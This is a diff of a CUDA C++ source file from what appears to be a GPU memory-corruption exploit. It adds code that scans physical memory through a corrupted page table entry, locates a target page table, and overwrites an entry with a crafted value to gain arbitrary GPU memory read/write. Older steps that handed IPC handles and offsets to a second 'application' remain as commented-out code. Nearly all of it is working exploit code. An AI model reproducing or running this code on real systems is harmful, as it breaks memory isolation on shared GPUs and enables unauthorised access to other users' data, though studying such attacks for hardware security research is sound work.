@@ -1,6 +1,10 @@
 #include "./s4_secondRegion.cuh"
 #include <iostream>
 #include <fstream>
+#include <sys/mman.h>
+#include <fcntl.h>
+#include <filesystem>
+#include <unistd.h>
 
 static void
 removeFirstArg (int &argc, char *argv[])
@@ -92,7 +96,7 @@ main (int argc, char *argv[])
   uint64_t target_pte_ofs = ((uint64_t)corrupted_ptr + initial_offset_1) % (2L * 1024 * 1024);
   for (uint64_t i = 0; i < (uint64_t)23L * 1024 * 1024 * 1024; i += ALLOC_SIZE)
     {
-      if (i > (uint64_t)12L * 1024 * 1024 * 1024)
+      if (i > (uint64_t)14L * 1024 * 1024 * 1024)
       { 
         memset_ptr<<<1,1>>>(corrupted_ptr + initial_offset_1, it_ptr, 8);
         cudaDeviceSynchronize();
@@ -136,40 +140,19 @@ main (int argc, char *argv[])
   }
 
 
-  cudaIpcMemHandle_t pt_handle;
-  cudaIpcMemHandle_t arb_handle;
-  cudaIpcGetMemHandle(&pt_handle, pt_rw_ptr);
-  cudaIpcGetMemHandle(&arb_handle, arb_rw_ptr);
-
-  std::ofstream file_pt("cuda_ipc_pt.bin", std::ios::binary);
-  file_pt.write(reinterpret_cast<char*>(&pt_handle), sizeof(pt_handle));
-  file_pt.close();
-
-  std::ofstream file_arb("cuda_ipc_arb.bin", std::ios::binary);
-  file_arb.write(reinterpret_cast<char*>(&arb_handle), sizeof(arb_handle));
-  file_arb.close();
-
   cudaMemcpyArray(data_device_ptr, (uint8_t*)pt_rw_ptr + target_pte_ofs, 8);
   std::cout << "PT rw:" << *(void**)data_device_ptr <<  " Orig: "<< pt_rw_orig_ptr << '\n';
   cudaMemcpyArray(data_device_ptr, (uint8_t*)arb_rw_ptr, 8);
   std::cout << "Arbitrary rw:" << *(void**)data_device_ptr << " Orig: "<< arb_rw_orig_ptr << '\n';
 
-  std::cout << "Wrote CUDA IPC handles to 'cuda_ipc_arb.bin' and 'cuda_ipc_pt.bin'.\n\033[1;32mNow start your application and open the handles\033[0m.\n";
-  std::cout << "Press \033[1;32mEnter Key\033[0m when done...";
-
-  std::cin.ignore(std::numeric_limits<std::streamsize>::max(), '\n');
-  pause();
-
-  // find orig pte entries:
-  //   for pt, make it the arb's physical location + offset
-  uint64_t arb_location = 0;
-  uint64_t pt_location = 0;
-  uint64_t arb_location_ofs = 0;
-  uint64_t pt_location_ofs = 0;
+   std::cin.ignore(std::numeric_limits<std::streamsize>::max(), '\n');
+  paused();
+  
   it_ptr = (uint64_t)(0x60000000000001);
+  void* target = 0;
   for (uint64_t i = 0; i < (uint64_t)46L * 1024 * 1024 * 1024; i += ALLOC_SIZE)
     {
-      if (i > (uint64_t)12L * 1024 * 1024 * 1024)
+      if (i > (uint64_t)5L * 1024 * 1024 * 1024)
       {
         memset_ptr<<<1,1>>>((uint8_t *)pt_rw_ptr + target_pte_ofs, it_ptr, 8);
         cudaDeviceSynchronize();
@@ -178,58 +161,201 @@ main (int argc, char *argv[])
         cudaDeviceSynchronize();
 
         cudaMemcpyArray(data_device_ptr, (uint8_t*)arb_rw_ptr, 2L * 1024 * 1024);
-        std::cout << (void*)it_ptr << ' ' << *(void**)data_device_ptr << '\n';
-        for (int z = 0; z < 2L * 1024 * 1024; z+=8)
+        std::cout << i << ' '<< (void*)it_ptr << ' ' << *(void**)data_device_ptr << '\n';
+        bool ispage = true;
+        if (*(void**)(data_device_ptr) == (void*)0x6464646464646464)
         {
-          if (*(void**)(data_device_ptr + z) == arb_rw_orig_ptr)
-          {
-            arb_location = it_ptr;
-            arb_location_ofs = z;
+          target = (void*)it_ptr;
             std::cout << "Found" << '\n';
-          }
-          if (*(void**)(data_device_ptr + z) == pt_rw_orig_ptr)
-          {
-            pt_location = it_ptr;
-            pt_location_ofs = z;
-            std::cout << "Found" << '\n';
-          }
+            break;
         }
-        
-        if (arb_location != 0 && pt_location != 0)
-        {
-          break;
-        }
+
         cudaDeviceSynchronize();
         gpuErrchk(cudaPeekAtLastError());   
       }
       it_ptr += 0x20000;
     }
 
-  // set new pt rw ptr to the PT's 2MB page
-  // pass new arb_location offset through file.
+  std::cout << (void*)target << '\n';
+  paused();
+  uint64_t other_ofs = 0;
+  uint64_t other_phys = 0;
+  it_ptr = (uint64_t)(0x60000000000001);
+  uint64_t mask =     0x00FFFFFFFFFF00ULL;
+  for (uint64_t i = 0; i < (uint64_t)46L * 1024 * 1024 * 1024; i += ALLOC_SIZE)
+    {
+      if (i > (uint64_t)14L * 1024 * 1024 * 1024)
+      {
+        memset_ptr<<<1,1>>>((uint8_t *)pt_rw_ptr + target_pte_ofs, it_ptr, 8);
+        cudaDeviceSynchronize();
+        gen_64KB(flush_ptr, flush_size);
+        simple_flush<<<1,1>>>(flush_ptr, flush_size);
+        cudaDeviceSynchronize();
+
+        cudaMemcpyArray(data_device_ptr, (uint8_t*)arb_rw_ptr, 2L * 1024 * 1024);
+        std::cout << i << ' ' << (void*)it_ptr << ' ' << *(void**)data_device_ptr << '\n';
+        for (uint64_t z = 0; z < 2L * 1024 * 1024; z+=8)
+        {
+          // std::cout << '\t' << z << ' ' << (void*)it_ptr << ' ' << *(void**)(data_device_ptr + z) << '\n';
+          if ((((*(uint64_t *)(data_device_ptr + z)) & mask) == ((uint64_t)target & mask)))
+          // if (*(void**)(data_device_ptr + z) == target)
+          {
+            other_ofs = z;
+            other_phys = it_ptr;
+            std::cout << "Found" << '\n';
+            break;
+          }
+        }
+        if (other_phys != 0)
+          break;
+
+        cudaDeviceSynchronize();
+        gpuErrchk(cudaPeekAtLastError());   
+      }
+      it_ptr += 0x20000;
+    }
+
+  memset_ptr<<<1,1>>>((uint8_t *)arb_rw_ptr + other_ofs, (uint64_t)0x060000000fff0005, 8);
+  cudaDeviceSynchronize();
+  gen_64KB(flush_ptr, flush_size);
   simple_flush<<<1,1>>>(flush_ptr, flush_size);
   cudaDeviceSynchronize();
+  
 
-  memset_ptr<<<1,1>>>((uint8_t *)pt_rw_ptr + target_pte_ofs, pt_location, 8);
-  cudaDeviceSynchronize();
+  // cudaIpcMemHandle_t pt_handle;
+  // cudaIpcMemHandle_t arb_handle;
+  // cudaIpcGetMemHandle(&pt_handle, pt_rw_ptr);
+  // cudaIpcGetMemHandle(&arb_handle, arb_rw_ptr);
 
-  memset_ptr<<<1,1>>>((uint8_t *)arb_rw_ptr + pt_location_ofs, pt_location, 8);
-  cudaDeviceSynchronize();
+  // std::ofstream file_pt("cuda_ipc_pt.bin", std::ios::binary);
+  // file_pt.write(reinterpret_cast<char*>(&pt_handle), sizeof(pt_handle));
+  // file_pt.close();
 
-  memset_ptr<<<1,1>>>((uint8_t *)pt_rw_ptr + arb_location_ofs, (uint64_t)(0x60000000000001), 8);
-  cudaDeviceSynchronize();
+  // std::ofstream file_arb("cuda_ipc_arb.bin", std::ios::binary);
+  // file_arb.write(reinterpret_cast<char*>(&arb_handle), sizeof(arb_handle));
+  // file_arb.close();
 
-  simple_flush<<<1,1>>>(flush_ptr, flush_size);
-  cudaDeviceSynchronize();
+  // std::cout << "Wrote CUDA IPC handles to 'cuda_ipc_arb.bin' and 'cuda_ipc_pt.bin'.\n\033[1;32mNow start your application and open the handles\033[0m.\n";
+  // std::cout << "Press \033[1;32mEnter Key\033[0m when done...";
 
-  std::ofstream new_ofs_file("new_offset.bin", std::ios::binary);
-  new_ofs_file.write(reinterpret_cast<char*>(&arb_location_ofs), sizeof(arb_location_ofs));
-  new_ofs_file.close();
+  // int shm_fd = shm_open("/exploitshm", O_CREAT | O_RDWR | O_TRUNC, 0666);
+  // if (shm_fd == -1) {
+  //     std::cerr << "Error creating shared memory" << std::endl;
+  //     return -1;
+  // }
+  // ftruncate(shm_fd, sizeof(cudaIpcMemHandle_t) * 2);
+  // cudaIpcMemHandle_t* shared_data = (cudaIpcMemHandle_t*)mmap(0, sizeof(cudaIpcMemHandle_t) * 2, PROT_READ | PROT_WRITE, MAP_SHARED, shm_fd, 0);
+  // if (shared_data == MAP_FAILED) {
+  //     std::cerr << "Error mapping shared memory" << std::endl;
+  //     return -1;
+  // }
+  // shared_data[0] = pt_handle;
+  // shared_data[1] = arb_handle;
 
-  std::cout << "Wrote new offset to 'new_offset.bin',\n\033[1;32mNow read the updated offset from this file in your application\033[0m.\n";
-  std::cout << "Your application should be able to have arbitrary RW as well now!\n";
-  std::cout << "Press \033[1;32mEnter Key\033[0m when done, the application will exit afterwards...";
-  pause();
+  // // std::system("./a.out");
+  
 
+  // cudaMemcpyArray(data_device_ptr, (uint8_t*)pt_rw_ptr + target_pte_ofs, 8);
+  // std::cout << "PT rw:" << *(void**)data_device_ptr <<  " Orig: "<< pt_rw_orig_ptr << '\n';
+  // cudaMemcpyArray(data_device_ptr, (uint8_t*)arb_rw_ptr, 8);
+  // std::cout << "Arbitrary rw:" << *(void**)data_device_ptr << " Orig: "<< arb_rw_orig_ptr << '\n';
+
+  // std::cin.ignore(std::numeric_limits<std::streamsize>::max(), '\n');
+  // paused();
+
+  // // find orig pte entries:
+  // //   for pt, make it the arb's physical location + offset
+  // uint64_t arb_location = 0;
+  // uint64_t pt_location = 0;
+  // uint64_t arb_location_ofs = 0;
+  // uint64_t pt_location_ofs = 0;
+  // it_ptr = (uint64_t)(0x60000000000001);
+  // for (uint64_t i = 0; i < (uint64_t)46L * 1024 * 1024 * 1024; i += ALLOC_SIZE)
+  //   {
+  //     if (i > (uint64_t)14L * 1024 * 1024 * 1024)
+  //     {
+  //       memset_ptr<<<1,1>>>((uint8_t *)pt_rw_ptr + target_pte_ofs, it_ptr, 8);
+  //       cudaDeviceSynchronize();
+  //       gen_64KB(flush_ptr, flush_size);
+  //       simple_flush<<<1,1>>>(flush_ptr, flush_size);
+  //       cudaDeviceSynchronize();
+
+  //       cudaMemcpyArray(data_device_ptr, (uint8_t*)arb_rw_ptr, 2L * 1024 * 1024);
+  //       std::cout << (void*)it_ptr << ' ' << *(void**)data_device_ptr << '\n';
+  //       for (int z = 0; z < 2L * 1024 * 1024; z+=8)
+  //       {
+  //         if (*(void**)(data_device_ptr + z) == arb_rw_orig_ptr)
+  //         {
+  //           arb_location = it_ptr;
+  //           arb_location_ofs = z;
+  //           std::cout << "Found" << '\n';
+  //         }
+  //         if (*(void**)(data_device_ptr + z) == pt_rw_orig_ptr)
+  //         {
+  //           pt_location = it_ptr;
+  //           pt_location_ofs = z;
+  //           std::cout << "Found" << '\n';
+  //         }
+  //       }
+        
+  //       if (arb_location != 0 && pt_location != 0)
+  //       {
+  //         break;
+  //       }
+  //       cudaDeviceSynchronize();
+  //       gpuErrchk(cudaPeekAtLastError());   
+  //     }
+  //     it_ptr += 0x20000;
+  //   }
+
+  // // set new pt rw ptr to the PT's 2MB page
+  // // pass new arb_location offset through file.
+  // simple_flush<<<1,1>>>(flush_ptr, flush_size);
+  // cudaDeviceSynchronize();
+
+  // // Change arbitrary RW to pt_location
+  // memset_ptr<<<1,1>>>((uint8_t *)pt_rw_ptr + target_pte_ofs, pt_location, 8);
+  // cudaDeviceSynchronize();
+
+  // simple_flush<<<1,1>>>(flush_ptr, flush_size);
+  // cudaDeviceSynchronize();
+
+  // // Point pt_rw_ptr to page table
+  // memset_ptr<<<1,1>>>((uint8_t *)arb_rw_ptr + pt_location_ofs, pt_location, 8);
+  // cudaDeviceSynchronize();
+
+  // simple_flush<<<1,1>>>(flush_ptr, flush_size);
+  // cudaDeviceSynchronize();
+
+  // // Point arbitrary RW to somewhere else
+  // memset_ptr<<<1,1>>>((uint8_t *)pt_rw_ptr + arb_location_ofs, (uint64_t)(0x60000000000001), 8);
+  // cudaDeviceSynchronize();
+
+  // simple_flush<<<1,1>>>(flush_ptr, flush_size);
+  // cudaDeviceSynchronize();
+
+  // memset_ptr<<<1,1>>>((uint8_t *)arb_rw_ptr, (uint64_t)(0xdeadbeef), 8);
+  // cudaDeviceSynchronize();
+  // cudaMemcpyArray(data_device_ptr, (uint8_t*)arb_rw_ptr, 8);
+  // std::cout << "Arbitrary rw:" << *(void**)data_device_ptr << " Orig: "<< arb_rw_orig_ptr << '\n';
+
+  // simple_flush<<<1,1>>>(flush_ptr, flush_size);
+  // cudaDeviceSynchronize();
+
+  // std::ofstream new_ofs_file("new_offset.bin", std::ios::binary);
+  // new_ofs_file.write(reinterpret_cast<char*>(&arb_location_ofs), sizeof(arb_location_ofs));
+  // new_ofs_file.close();
+  // std::cout << arb_location_ofs << '\n';
+
+  // std::cout << "Wrote new offset to 'new_offset.bin',\n\033[1;32mNow read the updated offset from this file in your application\033[0m.\n";
+  // std::cout << "Your application should be able to have arbitrary RW as well now!\n";
+  // std::cout << "Press \033[1;32mEnter Key\033[0m when done, the application will exit afterwards...";
+  //   simple_flush<<<1,1>>>(flush_ptr, flush_size);
+  // cudaDeviceSynchronize();
+  // paused();
+
+
+
+  // paused();
   return 0;
 }
